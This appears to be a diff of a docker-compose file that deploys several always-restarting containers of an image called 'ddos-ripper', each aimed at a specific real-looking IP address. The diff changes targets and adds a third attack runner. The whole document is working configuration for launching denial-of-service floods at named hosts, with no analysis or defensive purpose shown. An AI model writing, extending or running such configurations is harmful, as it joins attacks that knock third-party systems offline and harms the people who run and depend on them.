@@ -3,10 +3,12 @@ services:
   ddos-runner-1:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
-    command: 185.170.2.232
-    logging:
-      driver: none
+    command: 193.104.87.251
   ddos-runner-2:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
-    command: 185.170.2.231
+    command: 194.84.25.50
+  ddos-runner-3:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: 193.104.87.248
